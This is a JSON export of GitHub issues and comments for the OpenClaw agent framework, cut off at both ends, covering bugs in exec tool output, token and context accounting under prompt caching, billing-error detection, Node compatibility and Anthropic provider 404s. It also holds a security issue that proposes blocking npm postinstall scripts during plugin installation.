width=\"435\" height=\"794\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/4edae89e-3c15-4bad-b6a6-c16b8a32213c\" />\n<img width=\"435\" height=\"794\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/962fec29-50d4-47ca-81f1-9777eed28838\" />",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14117",
      "createdAt": "2026-02-11T14:19:08Z",
      "updatedAt": "2026-02-11T14:19:08Z",
      "author": "ro046283",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "imessage"
        ],
        "platforms": [
          "macos"
        ],
        "components": [
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 14115,
      "title": "[Bug]: OpenClaw exec tool returns empty output with Always Allow setting",
      "body": "# BUG: OpenClaw exec tool returns empty output with Always Allow setting\n\n## Environment\n- OpenClaw Version: 2026.2.9 (9194)\n- OS: macOS Darwin 25.2.0 (arm64)\n- Node: v24.7.0\n- Exec Approval: Always Allow (configured via GUI)\n- Session: agent:main:main (ebd3104...)\n\n## Expected Behavior\nWith Exec Approval set to \"Always Allow\", the exec tool should execute shell commands and return output.\n\n## Actual Behavior\nThe exec tool produces no output and no errors. It appears to execute but returns immediately with empty output.\n\n## Evidence\n\n### Test 1: Simple exec call\n```bash\n# Input\nexec --command \"echo test\"\n\n# Result\n(empty output, no errors)\nTest 2: Raw format with timeout\n# Input\nexec --raw '{\"command\":\"echo test\", \"timeout\": 5}'\n\n# Result  \n(empty output, no errors)\nTest 3: CLI check\nopenclaw exec echo hello\n# Output: error: unknown command 'exec'\nTest 4: No [tools] events in log\nGrep for [tools] in /tmp/openclaw/openclaw-2026-02-11.log returns 0 recent events, indicating OpenClaw is not logging tool usage.\n\nRegression Note\nThis worked correctly in Antigravity (predecessor) with Always Allow setting.\n\nPossible Causes\nExec Approval \"Always Allow\" not properly propagated to exec tool\nBroken RPC communication for exec between agent and gateway\nDifferent implementation between Antigravity and OpenClaw\nGateway not processing exec requests correctly\nLogging not capturing tool usage events\nRequired Fix\nVerify Exec Approval \"Always Allow\" is correctly applied to exec tool\nTest exec with multiple formats (simple, raw, with timeout)\nRestore parity with Antigravity functionality\nEnsure tool usage events are written to log files\nCurrent Workaround\nManual command execution by user (unsustainable for agent automation)\n\nPriority\nHIGH - Blocks full agent automation\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14115",
      "createdAt": "2026-02-11T14:12:34Z",
      "updatedAt": "2026-02-11T14:12:34Z",
      "author": "luigigalli",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "config"
        ]
      }
    },
    {
      "number": 13132,
      "title": "Security: Add --ignore-scripts to npm install during plugin installation",
      "body": "## Summary\n\nPlugin installation in `installs-*.js` runs `npm install` without the `--ignore-scripts` flag, allowing malicious plugins to execute arbitrary code via postinstall scripts.\n\n## Current Behavior\n\n```javascript\nconst npmRes = await runCommandWithTimeout([\n  \"npm\",\n  \"install\",\n  \"--omit=dev\",\n  \"--silent\"\n  // No --ignore-scripts flag\n], { ... });\n```\n\n## Risk\n\nA malicious plugin with a `postinstall` script in its `package.json` can execute arbitrary code on the host machine during installation — before any code safety scanner runs or user review occurs.\n\n## Recommended Fix\n\nAdd `--ignore-scripts` to all npm install commands in the plugin installation flow:\n\n```javascript\nconst npmRes = await runCommandWithTimeout([\n  \"npm\",\n  \"install\",\n  \"--omit=dev\",\n  \"--silent\",\n  \"--ignore-scripts\"\n], { ... });\n```\n\n## Context\n\nThe existing code safety scanner (#9806) is a good detection layer, but it runs *after* npm install completes. By that point, postinstall scripts have already executed.\n\nDefense in depth: block scripts by default, scan code, then optionally allow users to run scripts explicitly if needed.\n\n## Related\n\n- #9806 (code safety scanner)\n- #9858 (credential redaction)\n\ncc @abdelsfane",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13132",
      "createdAt": "2026-02-10T04:44:59Z",
      "updatedAt": "2026-02-11T14:08:44Z",
      "author": "markoalleno",
      "labels": [
        "bug",
        "security"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3884663880,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13132#issuecomment-3884663880",
          "createdAt": "2026-02-11T14:08:30Z",
          "updatedAt": "2026-02-11T14:08:30Z",
          "author": "davidahmann",
          "body": "Opened PR with scoped test hardening for install script suppression: https://github.com/openclaw/openclaw/pull/14112\\n\\nValidation run:  ERR_PNPM_RECURSIVE_EXEC_NO_PACKAGE  No package found in this workspace (pass).\\n\\nThis PR includes  so it will auto-close on merge."
        },
        {
          "id": 3884665220,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13132#issuecomment-3884665220",
          "createdAt": "2026-02-11T14:08:44Z",
          "updatedAt": "2026-02-11T14:08:44Z",
          "author": "davidahmann",
          "body": "Opened PR with scoped test hardening for install script suppression:\nhttps://github.com/openclaw/openclaw/pull/14112\n\nValidation run:\n- `pnpm exec vitest run src/plugins/install.test.ts` (pass)\n\nThe PR includes `Fixes #13132`, so GitHub will auto-close this issue on merge.\n"
        }
      ]
    },
    {
      "number": 14107,
      "title": "TypeError: Cannot assign to read-only property 'noDeprecation' on Node.js v23+",
      "body": "## Description\nWhen running `openclaw update` on Node.js v23.1.0, the following error occurs:\n\n```\nTypeError: Cannot assign to read only property 'noDeprecation' of object '#<process>'\n```\n\n## Environment\n- **Node.js version**: v23.1.0\n- **OS**: macOS (Darwin 24.1.0 arm64)\n- **OpenClaw version**: 2026.2.9 (33c75cb)\n\n## Steps to Reproduce\n1. Install Node.js v23.1.0\n2. Run `openclaw update`\n3. Error occurs after plugin loading\n\n## Root Cause\nStarting from Node.js v17+, the `process.noDeprecation` property became read-only and cannot be directly assigned. It must be set via the `--no-deprecation` command-line flag or environment variables.\n\n## Suggested Fix\nReplace direct assignment:\n```javascript\nprocess.noDeprecation = true;\n```\n\nWith a safer approach:\n```javascript\ntry {\n  process.noDeprecation = true;\n} catch (err) {\n  // Read-only in Node.js v17+, ignore\n}\n```\n\nOr check before assignment:\n```javascript\nif (Object.getOwnPropertyDescriptor(process, 'noDeprecation')?.writable !== false) {\n  process.noDeprecation = true;\n}\n```\n\n## Plugin Loading Log\n```\n13:54:20 [plugins] feishu_doc: Registered feishu_doc, feishu_app_scopes\n13:54:20 [plugins] feishu_wiki: Registered feishu_wiki tool\n13:54:20 [plugins] feishu_drive: Registered feishu_drive tool\n13:54:20 [plugins] feishu_bitable: Registered 6 bitable tools\nTypeError: Cannot assign to read only property 'noDeprecation' of object '#<process>'\n```",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14107",
      "createdAt": "2026-02-11T14:05:20Z",
      "updatedAt": "2026-02-11T14:05:20Z",
      "author": "coder-glzhu",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": []
      }
    },
    {
      "number": 13888,
      "title": "Billing error false positive from x402 HTTP 402 responses",
      "body": "We run x402scan (x402 payment protocol) as an MCP tool on OpenClaw. The x402 protocol uses HTTP 402 (Payment Required) as its core mechanism — every paid API call involves a 402 response as part of the normal payment flow.\n\nThe [`/\\b402\\b/` pattern in `ERROR_PATTERNS.billing`](https://github.com/openclaw/openclaw/blob/33c75cb6bf2dde53131f33a1ea4995e1aa8d550e/src/agents/pi-embedded-helpers/errors.ts#L471) matches any error text containing \"402\" as a standalone word. When x402 MCP tool output includes \"402\" (which it frequently does), `isBillingErrorMessage` returns true and the entire assistant message gets replaced with the billing error warning — even though the Anthropic API key is fine.\n\nThis surfaces as a false \"⚠️ API provider returned a billing error\" message in Discord while the bot is otherwise working normally.\n\nThe fix is probably to only match 402 when it comes from the LLM provider's HTTP response, not from tool call results or assistant text. Or drop the `/\\b402\\b/` pattern entirely since the other patterns (`\"payment required\"`, `\"insufficient credits\"`, etc.) cover actual billing errors without the false positive risk.\n\nWe're patching it out with sed for now but would love a proper fix upstream.\n\nSam Ragsdale — [Merit Systems](https://github.com/Merit-Systems)",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13888",
      "createdAt": "2026-02-11T05:04:53Z",
      "updatedAt": "2026-02-11T14:02:16Z",
      "author": "sragss",
      "labels": [],
      "taxonomy": {
        "channels": [
          "discord"
        ],
        "platforms": [],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3882391408,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13888#issuecomment-3882391408",
          "createdAt": "2026-02-11T05:59:13Z",
          "updatedAt": "2026-02-11T05:59:13Z",
          "author": "0xRaini",
          "body": "This is the same root cause as #13822 — the `/\\b402\\b/` regex is way too broad.\n\nI already have a PR up for this: **#13827** — it narrows the regex to only match actual HTTP 402 error patterns:\n\n```js\n// Before (catches everything):\n/\\b402\\b/\n\n// After (context-aware):\n/(?:status|code|http|error)\\s*[:=]?\\s*402\\b|^\\s*402\\s+payment/i\n```\n\nThis would fix your x402 MCP tool issue — normal `402` references in tool output won't trigger the billing error rewrite.\n\ncc @Merit-Systems — if you want to test before it's merged, the branch is on my fork."
        },
        {
          "id": 3884627846,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13888#issuecomment-3884627846",
          "createdAt": "2026-02-11T14:02:16Z",
          "updatedAt": "2026-02-11T14:02:16Z",
          "author": "sragss",
          "body": "Update: removing just `/\\b402\\b/` wasn't sufficient. The other patterns in `ERROR_PATTERNS.billing` — `\"payment required\"`, `\"insufficient credits\"`, `\"credit balance\"` — also false-positive on normal x402 MCP tool output. `\"payment required\"` is literally the HTTP 402 status text.\n\nWe ended up patching `isBillingErrorMessage` to always return `false`. The function runs on ALL outbound text via `sanitizeUserFacingText`, not just on LLM provider errors, which is what makes it so trigger-happy.\n\nSuggested fix: scope the billing error check to only run on actual LLM provider HTTP responses, not on tool results or assistant text."
        }
      ]
    },
    {
      "number": 13782,
      "title": "[Bug] /status Context display always shows 200k/200k due to cache token inflation",
      "body": "## Summary\n\n`/status` Context line consistently shows `200k/200k (100%)` even on sessions with minimal conversation history and 0 compactions.\n\n## Root Cause Found\n\nIn `src/agents/pi-embedded-runner/run.ts`, the `UsageAccumulator` sums usage across **all API calls within a single turn** (including tool-call round-trips):\n\n```typescript\n// mergeUsageIntoAccumulator (line ~108)\ntarget.total += usage.total ?? ...\ntarget.cacheRead += usage.cacheRead ?? 0\ntarget.cacheWrite += usage.cacheWrite ?? 0\n```\n\nWith Anthropic prompt caching, each API call reports `cacheRead ≈ current_context_size` (~80k tokens for a typical session with workspace files). If a turn involves 3 tool calls, that's 3 API round-trips, so:\n- Accumulated `cacheRead` = 80k × 3 = **240k**\n- Accumulated `total` = ~80k × 3 = **240k**\n\nThen `toNormalizedUsage()` (line ~117) passes these accumulated values to `deriveSessionTotalTokens()`, which computes:\n```\npromptTokens = input(accumulated) + cacheRead(accumulated) + cacheWrite(accumulated) = 240k+\ntotal = Math.min(promptTokens, contextWindow) = Math.min(240k, 200k) = 200,000\n```\n\nThis 200,000 is stored in `sessions.json` as `totalTokens` and displayed by `/status`.\n\n## Evidence\n\n**From the session transcript** (individual API calls):\n- Max single-call `cacheRead`: 81,748 tokens\n- Max single-call `totalTokens`: 82,384 tokens\n- Actual context size: ~80k tokens\n\n**From sessions.json** (accumulated):\n- `totalTokens: 200000` (clamped from inflated accumulation)\n- `compactionCount: 0` (confirming context is nowhere near 200k)\n\n**Pattern**: 7 out of 102 sessions show `totalTokens: 200000`. All are sessions with tool calls. Sessions without tool calls show correct values.\n\n## Fix Suggestion\n\nFor context display purposes, `totalTokens` should reflect the **last API call's prompt size** (representing current context), not the sum across all calls in a turn. Options:\n1. Track both `accumulatedTotal` (for cost) and `lastPromptTokens` (for context display) separately\n2. Use only the last call's usage for the session store's `totalTokens`\n3. Divide accumulated values by the number of API calls (less accurate but simple)\n\n## Reproduction\n\n1. Open a session with `compaction.mode: \"safeguard\"` (default)\n2. Send a message that triggers 2+ tool calls\n3. Run `/status` → `Context: 200k/200k (100%)` with `Compactions: 0`\n\n## Environment\n\n- Version: 2026.2.9 (33c75cb)\n- Provider: Anthropic (Claude Opus 4)\n- Model: claude-opus-4-6 (200k context window)\n- Prompt caching: enabled",
      "state": "open",
      "comments": 3,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13782",
      "createdAt": "2026-02-11T01:37:39Z",
      "updatedAt": "2026-02-11T14:02:00Z",
      "author": "akari-musubi",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3881692685,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13782#issuecomment-3881692685",
          "createdAt": "2026-02-11T01:58:20Z",
          "updatedAt": "2026-02-11T01:58:20Z",
          "author": "akari-musubi",
          "body": "This is likely the same root cause as #13698.\n\n**Root cause identified**: PR #11664 (commit `191da1feb`, included in v2026.2.9) introduced `UsageAccumulator` in `src/agents/pi-embedded-runner/run.ts` that **sums usage across all API calls within a single turn**. With Anthropic prompt caching, each API call reports `cacheRead ≈ current_context_size`. After N tool-call round-trips, the accumulated total becomes N × actual_context_size, which gets clamped to `contextWindow` (200k) by `deriveSessionTotalTokens()`.\n\nThis did not occur in versions prior to v2026.2.9."
        },
        {
          "id": 3884602750,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13782#issuecomment-3884602750",
          "createdAt": "2026-02-11T13:57:26Z",
          "updatedAt": "2026-02-11T13:57:26Z",
          "author": "vpesh",
          "body": "I opened a candidate fix in PR #14102.\n\nIt addresses two related behaviors:\n\n1. `totalTokens` inflation to `contextTokens` by persisting latest-call prompt tokens for session context accounting.\n2. missed auto-compaction retries for overflow wording variants by switching run-loop detection to `isLikelyContextOverflowError(...)`.\n\nPR: https://github.com/openclaw/openclaw/pull/14102\n"
        },
        {
          "id": 3884624912,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13782#issuecomment-3884624912",
          "createdAt": "2026-02-11T14:01:41Z",
          "updatedAt": "2026-02-11T14:02:00Z",
          "author": "aaronprivate95-glitch",
          "body": "Good catch — this is a classic prompt-caching accounting trap.\n\nImplementation-wise, I’d strongly recommend splitting **cost vs context**:\n- turnCostTokens: SUM across model calls (for billing / cost dashboards)\n- contextTokens: MAX (or last-call) prompt-like tokens = input + cacheRead + cacheWrite (for /status + compaction heuristics)\n\nUsing MAX prevents multi-tool turns from pinning the UI at 200k/200k while still preserving accurate spend.\n\nChecklist + drop-in TS helper (with a quick test idea):\nhttps://gist.github.com/aaronprivate95-glitch/479725e1f1bb62d8790e168ce324e600\n\nIf anyone needs help wiring this into the runner / session schema, I’m available: https://gist.github.com/aaronprivate95-glitch/8014d76a8675751f4f67da32b668bc0a"
        }
      ]
    },
    {
      "number": 13853,
      "title": "Context % inflated by cache tokens in deriveSessionTotalTokens — causes premature compaction",
      "body": "## Bug Description\n\n`deriveSessionTotalTokens` in the session token tracking calculates `totalTokens` as `input + cacheRead + cacheWrite`, which triple-counts cached content when using Anthropic models with prompt caching.\n\n## Root Cause\n\n```javascript\nfunction derivePromptTokens(usage) {\n  const sum = input + cacheRead + cacheWrite;\n  return sum > 0 ? sum : undefined;\n}\n\nfunction deriveSessionTotalTokens(params) {\n  let total = derivePromptTokens({input, cacheRead, cacheWrite}) ?? usage.total ?? input;\n  total = Math.min(total, contextTokens); // capped at context window\n  return total;\n}\n```\n\nAnthropic's `cacheRead` tokens are cumulative — they represent previously cached system prompt and early messages re-read on every turn. With a long conversation, `cacheRead` can easily reach 100K+. Adding `input + cacheRead + cacheWrite` produces a sum far exceeding actual context usage, which then gets capped at `contextTokens` (e.g., 200K).\n\n## Observed Behavior\n\n- **Context % oscillates** between ~71% and 100% depending on cache hit ratio\n- When `cacheRead` is high (most prompt was cached), sum blows past 200K → capped to exactly 200K → shows **100%**\n- When `cacheRead` happens to be lower, it shows the real number (~71%)\n- **Premature auto-compaction triggers** because the system thinks context is full when it's actually ~71% used\n- `/status` and `session_status` both report the inflated number\n\n## Expected Behavior\n\nContext percentage should reflect actual tokens sent to the model (`input` or `prompt_tokens`), not the sum of input + cached reads + cached writes. Cache tokens don't consume additional context window — they're already part of the prompt.\n\n## Impact\n\n- False 100% context readings trigger unnecessary auto-compaction\n- Users lose conversation history to premature compaction\n- Context-monitoring hooks/automations fire false alarms\n- The `reserveTokensFloor` and compaction thresholds become unreliable\n\n## Suggested Fix\n\n`derivePromptTokens` should use `input` (or `prompt_tokens`) alone for context percentage calculation, not the sum with cache tokens:\n\n```javascript\nfunction derivePromptTokens(usage) {\n  // For context % calculation, use input tokens only\n  // cacheRead/cacheWrite don't consume additional context window\n  return usage.input > 0 ? usage.input : undefined;\n}\n```\n\nOr alternatively, track `cacheRead`/`cacheWrite` separately for cost reporting but exclude them from the context usage ratio.\n\n## Environment\n\n- OpenClaw version: 2026.2.9\n- Model: anthropic/claude-opus-4-6 (200K context)\n- OS: macOS (Apple Silicon)\n\n## Workaround\n\nIn gate-runner hooks, we use `entry.inputTokens` instead of `entry.totalTokens` for context % calculations.",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13853",
      "createdAt": "2026-02-11T03:35:31Z",
      "updatedAt": "2026-02-11T13:57:26Z",
      "author": "vanek-nutic",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3881998144,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13853#issuecomment-3881998144",
          "createdAt": "2026-02-11T04:02:46Z",
          "updatedAt": "2026-02-11T04:02:46Z",
          "author": "0xRaini",
          "body": "Looking into this — the root cause is clear: `derivePromptTokens` sums `input + cacheRead + cacheWrite`, but `cacheRead` tokens are already part of what was sent to the model (they're just served from cache instead of re-processed). Adding them inflates the total past the real context usage.\n\n**Suggested fix:** Use `input` (or `prompt_tokens` from API response) as the sole basis for context percentage. `cacheRead` and `cacheWrite` are informational metrics, not additive to context window consumption.\n\n```ts\n// Before (inflated):\nconst sum = input + cacheRead + cacheWrite;\n\n// After (accurate):\nconst sum = input;\n// cacheRead/cacheWrite tracked separately for cost display only\n```\n\nThis would fix the premature compaction trigger and the oscillating context % in `/status`.\n\nHappy to take this on if you'd like a PR!"
        },
        {
          "id": 3884602709,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13853#issuecomment-3884602709",
          "createdAt": "2026-02-11T13:57:25Z",
          "updatedAt": "2026-02-11T13:57:25Z",
          "author": "vpesh",
          "body": "I opened PR #14102 with a fix candidate.\n\nImplementation detail: it does not reinterpret cache metrics globally; instead it stores explicit latest-call prompt size (`promptTokens`) for session context accounting, while preserving accumulated usage fields for run metadata.\n\nPR: https://github.com/openclaw/openclaw/pull/14102\n"
        }
      ]
    },
    {
      "number": 13698,
      "title": "Bug: sessions.recent returns totalTokens maxed at contextTokens (200000) instead of actual usage",
      "body": "## Description\n\nThe gateway `status` RPC returns `totalTokens` equal to `contextTokens` (e.g., 200000) for sessions, causing UIs to display 100% context usage when actual usage is much lower (20-40%).\n\n## Evidence\n\n`sessions_list` returns:\n```json\n{\n  \"key\": \"agent:main:main\",\n  \"totalTokens\": 200000,\n  \"contextTokens\": 200000\n}\n```\n\nBut `session_status` (which uses a different code path) correctly returns:\n```json\n{\n  \"totalTokens\": 43712,\n  \"contextTokens\": 200000,\n  \"percentUsed\": 22\n}\n```\n\nMultiple cron sessions also show `totalTokens: 200000` incorrectly.\n\n## Impact\n\n- Webclaw/TUI info bars show 100% context filled\n- Users send `/compact` unnecessarily\n- Confusing UX\n\n## Steps to Reproduce\n\n1. Start a session, send some messages\n2. Call `sessions_list` or check gateway `status` RPC `sessions.recent`\n3. Compare `totalTokens` vs actual (via `session_status` or manual count)\n\n## Environment\n\n- Version: 2026.2.9\n- Platform: Linux x64\n- Model: claude-opus-4-5 (200K context)\n\n## Possibly Related\n\n- #8196 (tokens showing zero instead of actual)\n- #5457 (stale token counts in memory flush)\n\nBoth suggest token accounting in `sessions.recent` is broken. This issue is the \"maxed out\" variant vs #8196's \"zeroed\" variant.",
      "state": "open",
      "comments": 3,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13698",
      "createdAt": "2026-02-10T22:21:54Z",
      "updatedAt": "2026-02-11T13:57:26Z",
      "author": "nyx4385",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "tui",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3881082689,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13698#issuecomment-3881082689",
          "createdAt": "2026-02-10T22:29:26Z",
          "updatedAt": "2026-02-10T22:29:26Z",
          "author": "nyx4385",
          "body": "## Investigation Update\n\nTraced the code path in `dist/extensionAPI.js` and `dist/agent-*.js`:\n\n### Findings\n\n1. **Session store has wrong value**: `sessions.json` shows `totalTokens: 200000` but transcript usage shows ~84k-120k per message\n\n2. **Two code paths with different results**:\n   - `session_status` tool → reads from transcript → **correct** (44k/200k = 22%)\n   - `sessions_list` / `status` RPC → reads from session store → **wrong** (200000/200000 = 100%)\n\n3. **Session store not updating**: The `sessions.json` file hasn't been modified in 5+ minutes despite ongoing agent runs\n\n4. **Clamping logic**: `deriveSessionTotalTokens()` clamps `total = Math.min(total, contextTokens)` — if upstream calculation is wrong (e.g., cumulative instead of per-run), it would max out at contextTokens\n\n### Possibly Related\n\n- #5771 — different symptom (false positive overflow detection from response text) but same area (context/token tracking)\n- #8196 — tokens showing as zero instead of actual\n\n### Proposed Fix Direction\n\nThe `session_status` code path correctly reads from transcript. The session store update path (`updateSessionStoreAfterAgentRun`) should either:\n1. Use the same transcript-reading logic\n2. Or ensure `deriveSessionTotalTokens` receives per-message usage, not cumulative"
        },
        {
          "id": 3881692942,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13698#issuecomment-3881692942",
          "createdAt": "2026-02-11T01:58:28Z",
          "updatedAt": "2026-02-11T01:58:28Z",
          "author": "akari-musubi",
          "body": "I've independently identified the same issue and traced the root cause. See #13782 for the full analysis.\n\n**TL;DR**: PR #11664 introduced `UsageAccumulator` that sums `cacheRead`/`cacheWrite`/`total` across all API calls in a turn. With Anthropic prompt caching, each call reports `cacheRead ≈ context_size`, so after N tool calls the accumulated value is N × actual_context, which gets clamped to `contextWindow` by `deriveSessionTotalTokens()`.\n\nThe fix should use the **last API call's usage** for context display (session store `totalTokens`) instead of the accumulated sum."
        },
        {
          "id": 3884602716,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13698#issuecomment-3884602716",
          "createdAt": "2026-02-11T13:57:25Z",
          "updatedAt": "2026-02-11T13:57:25Z",
          "author": "vpesh",
          "body": "Posted a PR with a fix candidate: #14102\n\nThe change keeps accumulated usage for run metadata, but persists session context using latest-call prompt tokens (`promptTokens` override path), which avoids `totalTokens` pinning at `contextTokens` in tool-heavy turns.\n\nPR: https://github.com/openclaw/openclaw/pull/14102\n"
        }
      ]
    },
    {
      "number": 9422,
      "title": "[Bug]: Direct Anthropic API Provider Returns 404 Errors",
      "body": "# OpenClaw Bug Report: Direct Anthropic API Provider Returns 404 Errors\n\n## Summary\nThe direct Anthropic API provider in OpenClaw consistently returns `HTTP 404: not_found_error: Not Found` errors when trying to use Claude models, despite the API key and model IDs being valid and working correctly with direct curl requests.\n\n## Environment\n- **OpenClaw CLI Version**: 2026.1.30 (76b5208)\n- **Config Last Modified By**: OpenClaw 2026.2.2-3\n- **System**: Linux VM -- Ubuntu 24.04.3 LTS\n- **Gateway Mode**: local\n- **Gateway Port**: 18789\n\n## Configuration\n\n### Anthropic Provider Configuration\n```json\n{\n  \"models\": {\n    \"providers\": {\n      \"anthropic\": {\n        \"baseUrl\": \"https://api.anthropic.com/v1\",\n        \"apiKey\": \"sk-ant-api03-REDACTED\",\n        \"api\": \"anthropic-messages\",\n        \"models\": [\n          {\n            \"id\": \"claude-sonnet-4-5-20250929\",\n            \"name\": \"Claude 4.5 Sonnet\",\n            \"reasoning\": false,\n            \"input\": [\"text\"],\n            \"cost\": {\n              \"input\": 0,\n              \"output\": 0,\n              \"cacheRead\": 0,\n              \"cacheWrite\": 0\n            },\n            \"contextWindow\": 200000,\n            \"maxTokens\": 8192\n          }\n        ]\n      }\n    }\n  },\n  \"agents\": {\n    \"defaults\": {\n      \"model\": {\n        \"primary\": \"anthropic/claude-sonnet-4-5-20250929\",\n        \"fallbacks\": [\"anthropic/claude-sonnet-4-5-20250929\"]\n      }\n    }\n  }\n}\n```\n\n### Auth Profile\n```json\n{\n  \"auth\": {\n    \"profiles\": {\n      \"anthropic:default\": {\n        \"provider\": \"anthropic\",\n        \"mode\": \"api_key\"\n      }\n    }\n  }\n}\n```\n\n## Steps to Reproduce\n\n1. Configure OpenClaw with direct Anthropic API provider as shown above\n2. Set `anthropic/claude-sonnet-4-5-20250929` as the primary model\n3. Attempt to use the agent via any channel (Discord, CLI, etc.):\n   ```bash\n   openclaw agent --message 'test' --session-id test-session\n   ```\n4. Observe 404 error: `HTTP 404 not_found_error: Not Found (request_id: req_...)`\n\n## Expected Behavior\nOpenClaw should successfully make API calls to Anthropic and receive responses from Claude models.\n\n## Actual Behavior\nAll requests fail with HTTP 404 errors, regardless of:\n- Which Claude model is specified (tried `claude-sonnet-4-5-20250929`, `claude-3-5-sonnet-20241022`, etc.)\n- Whether accessed via Discord, CLI agent command, or other channels\n- Session clearing and gateway restarts\n\n## Verification: Direct API Calls Work\n\nThe same API key and model work perfectly with direct curl requests:\n\n```bash\ncurl -X POST https://api.anthropic.com/v1/messages \\\n  -H \"Content-Type: application/json\" \\\n  -H \"x-api-key: sk-ant-api03-REDACTED\" \\\n  -H \"anthropic-version: 2023-06-01\" \\\n  -d '{\"model\": \"claude-sonnet-4-5-20250929\", \"max_tokens\": 50, \"messages\": [{\"role\": \"user\", \"content\": \"hi\"}]}'\n```\n\n**Response**: ✅ Success - Returns proper response from Claude\n\n## Model List Output\n```\n$ openclaw models list\nModel                                      Input      Ctx      Local Auth  Tags\nanthropic/claude-sonnet-4-5-20250929       text       195k     no    yes   default,fallback#1,configured\n```\n\nThe model appears as properly configured and authenticated.\n\n## Workaround\nUsing Claude through the `google-antigravity` provider (Vertex AI) works correctly:\n\n```bash\nopenclaw config set agents.defaults.model.primary 'google-antigravity/claude-opus-4-5-thinking'\n```\n\nThis successfully uses Claude without 404 errors.\n\n## Hypothesis\nThere may be a discrepancy in how OpenClaw constructs API requests to the direct Anthropic API versus what the Anthropic API expects. Possible issues:\n- Incorrect `anthropic-version` header\n- Malformed request endpoint (baseUrl concatenation issue?)\n- Missing required headers\n- Incorrect authentication header format for the direct API\n- Issue with the `\"api\": \"anthropic-messages\"` configuration value\n\n## Additional Context\n- The config file was last modified by a newer OpenClaw version (2026.2.2-3) than the running CLI (2026.1.30), though doctor output doesn't indicate this as problematic for the API issue\n- Debug logging is enabled (`\"level\": \"debug\"`) but no detailed HTTP request logs were found in `~/.openclaw/logs/`\n- Clearing sessions and restarting gateway did not resolve the issue\n\n## Requested Information\nTo help diagnose this issue, it would be helpful to know:\n1. What HTTP headers does OpenClaw send to the Anthropic API?\n2. What is the exact endpoint URL constructed from the baseUrl?\n3. What `anthropic-version` header value is used?\n4. Are there any additional required configuration parameters for the direct Anthropic provider?\n\n## Contact\nIf you need additional information or testing, please let me know.\n",
      "state": "open",
      "comments": 4,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/9422",
      "createdAt": "2026-02-05T06:25:14Z",
      "updatedAt": "2026-02-11T13:55:26Z",
      "author": "adampaulsen",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "discord"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3854731577,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/9422#issuecomment-3854731577",
          "createdAt": "2026-02-05T16:21:13Z",
          "updatedAt": "2026-02-05T16:21:13Z",
          "author": "m8ki",
          "body": "I have the same issue"
        },
        {
          "id": 3854809907,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/9422#issuecomment-3854809907",
          "createdAt": "2026-02-05T16:34:35Z",
          "updatedAt": "2026-02-05T16:34:35Z",
          "author": "divol89",
          "body": "## Analysis\n\nThis is a configuration issue. The 404 errors suggest the request URL is malformed.\n\n## Root Cause\n\nThe issue is likely in the `baseUrl` configuration. Looking at your config:\n\n```json\n\"baseUrl\": \"https://api.anthropic.com/v1\"\n```\n\nThe pi-ai library (used internally) may be appending `/v1` again, resulting in:\n```\nhttps://api.anthropic.com/v1/v1/messages  ← 404\n```\n\n## Solution\n\nTry setting baseUrl **without** the `/v1` suffix:\n\n```json\n{\n  \"models\": {\n    \"providers\": {\n      \"anthropic\": {\n        \"baseUrl\": \"https://api.anthropic.com\",\n        \"apiKey\": \"sk-ant-api03-...\",\n        \"api\": \"anthropic-messages\"\n      }\n    }\n  }\n}\n```\n\n## Verification\n\nAfter changing baseUrl, restart gateway and test:\n```bash\nopenclaw agent --message \"test\" --model anthropic/claude-sonnet-4-5-20250929\n```\n\n## If Still Failing\n\nIf 404 persists, please enable debug logging:\n```bash\nDEBUG=agent* openclaw gateway\n```\n\nAnd share the full request URL from logs (redact API key).\n\n## Status\n\nThe direct Anthropic provider should work - the issue is likely double `/v1` in URL path. The google-antigravity workaround works because it uses a different endpoint structure.\n\n---\n*Analyzed by OpenClaw Bot* 🤖\n"
        },
